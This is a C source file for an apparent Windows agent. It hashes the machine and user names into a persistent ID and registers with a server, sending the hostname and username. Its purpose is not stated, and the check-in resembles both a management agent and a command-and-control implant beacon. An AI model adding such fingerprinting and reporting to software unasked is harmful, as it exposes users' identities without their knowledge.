#include "../include/agent.h"
#include "../include/xxh3.h"
#include "../include/log.h"
#include "../include/http.h"
#include "../include/config.h"
#include <windows.h>
#include <stdio.h>
#include <string.h>

void load_agent_id(void) {
    if(cfg.agent_id[0]) return;
    FILE *f=fopen(".agent.id","r");
    if(f) {
        if(fgets(cfg.agent_id,sizeof(cfg.agent_id),f)) {
            int k=(int)strlen(cfg.agent_id);
            while(k>0&&cfg.agent_id[k-1]<=' ') cfg.agent_id[--k]=0;
        }
        fclose(f);
    }
    if(cfg.agent_id[0]) return;
    char comp[64]="", user[64]=""; DWORD sz=sizeof(comp);
    GetComputerNameA(comp,&sz); sz=sizeof(user); GetUserNameA(user,&sz);
    char buf[128]; snprintf(buf,sizeof(buf),"%s|%s",comp,user);
    xxh3_rev_b64(buf,(int)strlen(buf),cfg.agent_id);
    cfg.agent_id[16]=0;
    f=fopen(".agent.id","w");
    if(f) { fprintf(f,"%s",cfg.agent_id); fclose(f); }
    log_info("Agent ID generated: %s",cfg.agent_id);
}

void register_agent(void) {
    load_agent_id();
    char body[512];
    char comp[64]="", user[64]=""; DWORD sz=sizeof(comp);
    GetComputerNameA(comp,&sz); sz=sizeof(user); GetUserNameA(user,&sz);
    snprintf(body,sizeof(body),"{\"adbfid\":\"%s\",\"hostname\":\"%s\",\"username\":\"%s\",\"version\":\"%s\",\"platform\":\"Windows\"}", cfg.agent_id,comp,user,VERSION);
    Buf r; binit(&r); http_req("register_agent","system",body,&r); bfree(&r);
}
